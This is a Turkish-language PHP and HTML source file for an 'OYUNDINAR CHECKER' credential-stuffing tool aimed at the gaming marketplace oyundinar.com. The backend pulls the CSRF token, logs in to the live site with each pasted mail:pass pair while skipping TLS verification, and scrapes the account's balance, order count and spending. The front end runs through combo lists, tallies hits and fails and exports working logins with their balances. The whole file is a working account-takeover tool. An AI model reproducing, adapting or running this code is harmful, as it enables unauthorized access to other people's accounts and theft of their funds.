<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    // LR PARSE
    function parse_lr($source, $left, $right) {
        if (empty($source)) return '';
        $str = explode($left, $source);
        if (isset($str[1])) {
            $str = explode($right, $str[1]);
            return trim($str[0]);
        }
        return '';
    }

    // Request Yönetimi
    function oyundinar_curl($url, $method = 'GET', $post = null, $cookies = "") {
        $ch = curl_init($url);
        $headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language: tr-TR,tr;q=0.9",
            "Origin: https://www.oyundinar.com",
            "Referer: https://www.oyundinar.com/hesap"
        ];

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
        
        if ($post) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            $headers[] = "Content-Type: application/x-www-form-urlencoded";
        }
        if ($cookies) curl_setopt($ch, CURLOPT_COOKIE, $cookies);

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($response, 0, $header_size);
        $body = substr($response, $header_size);
        curl_close($ch);

        return ['header' => $header, 'body' => $body];
    }

    // 1. ADIM: CSRF Yakala
    $step1 = oyundinar_curl("https://www.oyundinar.com/hesap");
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $step1['header'], $matches);
    $cookies = implode("; ", $matches[1]);
    $csrf_token = parse_lr($cookies, 'csrf_cookie_name=', ';');

    // 2. ADIM: LOGIN
    $postData = "csrf_test_name=$csrf_token&mail=" . urlencode($user) . "&password=" . urlencode($pass) . "&btn+btn-primary+w-100=Giri%C5%9F+Yap";
    $step2 = oyundinar_curl("https://www.oyundinar.com/login/loginClient", "POST", $postData, $cookies);
    
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $step2['header'], $new_matches);
    if(!empty($new_matches[1])) $cookies .= "; " . implode("; ", $new_matches[1]);

    // 3. ADIM: CLIENT (Profil)
    $step3 = oyundinar_curl("https://www.oyundinar.com/client", "GET", null, $cookies);
    $source = $step3['body'];

    // VERİ ÇEKME (CAPTURE)
    $bakiye = parse_lr($source, '<span class="stat-value">', '₺</span>');
    $toplamSiparis = parse_lr($source, '<span class="stat-label">Toplam Sipariş</span>', '</span>');
    $toplamHarcama = parse_lr($source, '<span class="stat-label">Toplam Harcama</span>', '</span>');

    // KRİTİK KONTROL: Eğer veriler boşsa veya çekilemediyse FAIL ver.
    if ($bakiye !== '' && $toplamSiparis !== '' && $toplamHarcama !== '') {
        echo json_encode([
            'status' => 'success',
            'user' => $user, 
            'pass' => $pass, 
            'plan' => 'AKTİF HESAP',
            'p_info' => "Bakiye: $bakiye ₺",
            'd_info' => "Sipariş: $toplamSiparis",
            'sub_info' => "Harcama: $toplamHarcama"
        ]);
    } else {
        // Response boşsa veya capture yapılamıyorsa fail döner
        echo json_encode(['status' => 'fail', 'user' => $user]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>OYUNDINAR CHECKER | CYBER EXPLOIT</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030508; color: #e2e8f0; font-family: 'Inter', sans-serif; }
        .neon-blue { box-shadow: 0 0 15px rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.3); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-red { box-shadow: 0 0 15px rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); }
        .main-card { background: rgba(15, 18, 26, 0.9); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #0a0c12; border: 1px solid #1f2937; border-radius: 12px; color: #60a5fa; font-family: 'Consolas', monospace; outline: none; }
        .hit-box { background: linear-gradient(145deg, #0f121a, #0a0c12); border-left: 4px solid #10b981; border-radius: 12px; }
        .animate-fade { animation: fadeInUp 0.5s ease forwards; }
        @keyframes fadeInUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="p-4 md:p-8">

    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8 animate-fade">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-orange-600 rounded-lg flex items-center justify-center shadow-lg shadow-orange-600/30">
                <i class="fas fa-gamepad text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">
                OYUNDINAR<span class="text-orange-500">CHECKER</span><span class="text-gray-600 text-xs ml-2">v2.1</span>
            </h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-500 border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black transition-all uppercase tracking-widest">
            <i class="fas fa-power-off mr-2"></i> Çıkış
        </a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8 animate-fade">
        <div class="main-card p-6 neon-blue">
            <span class="text-gray-500 text-[10px] font-black uppercase tracking-widest block mb-1">Kalan İşlem</span>
            <div class="text-4xl font-black" id="kalan_val">0</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase tracking-widest block mb-1">Hit</span>
            <div class="text-4xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase tracking-widest block mb-1">Fail</span>
            <div class="text-4xl font-black text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5 animate-fade">
            <div class="main-card p-6">
                <div class="flex items-center gap-3 mb-4 border-b border-white/5 pb-3">
                    <i class="fas fa-list-ul text-blue-500"></i>
                    <h2 class="text-lg font-black uppercase tracking-tighter">Hesap Listesi</h2>
                </div>
                <textarea id="accs" class="input-area h-[300px] p-4 text-xs w-full" placeholder="mail:pass"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-orange-600 rounded-xl text-white font-black uppercase tracking-widest hover:bg-orange-700 transition-all text-sm">
                    Sistemi Başlat
                </button>
            </div>
        </div>

        <div class="lg:col-span-8 animate-fade">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase tracking-tighter">Capture Log</h2>
                <button onclick="downloadHits()" class="bg-green-600 px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest flex items-center gap-2">
                    <i class="fas fa-download"></i> İndir
                </button>
            </div>
            <div class="main-card p-6 h-[600px] overflow-y-auto space-y-4" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic">
                    <i class="fas fa-terminal text-7xl mb-4"></i>
                    <p class="font-black uppercase tracking-[0.3em]">Data bekleniyor...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let running = false;
        let hits = 0; let fails = 0;
        let hitResults = [];

        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");

            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR";
            btn.classList.replace('bg-orange-600', 'bg-red-600');
            document.getElementById('kalan_val').innerText = list.length;

            for(let line of list) {
                if(!running) break;
                const parts = line.trim().split(':');
                if(parts.length < 2) continue;
                
                try {
                    const fd = new FormData(); 
                    fd.append('user', parts[0]); 
                    fd.append('pass', parts[1]);
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();

                    if(res.status === 'success') {
                        hits++;
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | ${res.p_info} | ${res.d_info} | ${res.sub_info}`);
                        addHit(res);
                    } else {
                        fails++;
                        document.getElementById('fail_count').innerText = fails;
                    }
                } catch(e) { 
                    fails++;
                    document.getElementById('fail_count').innerText = fails;
                }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false;
            btn.innerText = "SİSTEMİ BAŞLAT";
            btn.classList.replace('bg-red-600', 'bg-orange-600');
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            
            const div = document.createElement('div');
            div.className = 'hit-box p-4 animate-fade mb-4 border-l-orange-500';
            div.innerHTML = `
                <div class="flex justify-between items-center border-b border-white/5 pb-2 mb-2">
                    <div class="text-xs"><span class="text-orange-400 font-bold">${res.user}</span>:<span class="opacity-60">${res.pass}</span></div>
                    <div class="text-sm font-black text-green-500 uppercase">HIT</div>
                </div>
                <div class="grid grid-cols-1 gap-1 text-[10px] font-mono">
                    <div class="text-blue-300"><i class="fas fa-wallet mr-1"></i> ${res.p_info}</div>
                    <div class="text-orange-300"><i class="fas fa-shopping-cart mr-1"></i> ${res.d_info}</div>
                    <div class="text-green-200"><i class="fas fa-credit-card mr-1"></i> ${res.sub_info}</div>
                </div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `OYUNDINAR_HITS.txt`;
            a.click();
        }
    </script>
</body>
</html>